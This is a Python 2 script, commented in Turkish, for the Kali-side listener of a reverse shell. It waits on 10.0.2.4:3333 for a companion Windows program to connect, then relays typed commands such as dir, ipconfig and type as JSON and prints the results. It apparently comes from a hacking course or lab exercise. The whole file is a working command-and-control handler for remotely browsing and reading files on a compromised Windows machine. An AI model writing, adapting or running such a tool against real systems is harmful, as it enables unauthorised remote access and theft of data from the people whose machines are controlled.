import socket
import json

# bu dosya kali linuxda çalışacak ve ilk bu dosya çalışacaktır. 
# daha sonra My-Socket-For-windows dosyası windows üzerinde çalışacaktır.
# ve artık cmd komutları ıle windows uzerındekı bilgileri edinebiliriz. 
# dir ipconfig type file_name.txt  cd ..  cd file_name gibi komutları kullanarak

class SocketListener :
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)  # connection limit = 0
        print("listening......")
        (self.my_connection, my_adress) = my_listener.accept()
        print("Connection OK for Kali from : " + str(my_adress))

    def json_send(self,data):
        json_data= json.dumps(data)
        self.my_connection.send(json_data)

    def json_receive(self):
        json_data = ""
        while True :
            try :
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue

    def command_execution(self,command_input):
        self.json_send(command_input)

        if(command_input[0] == "quit") :
            self.my_connection.close()
            exit()

        return self.json_receive()

    def start_listener(self):
        while True:
            command_input = raw_input("Enter command : ")
            command_input = command_input.split(" ", 1)
            command_output = self.command_execution(command_input)
            print(command_output)

my_socket_listener = SocketListener("10.0.2.4",3333)
my_socket_listener.start_listener()

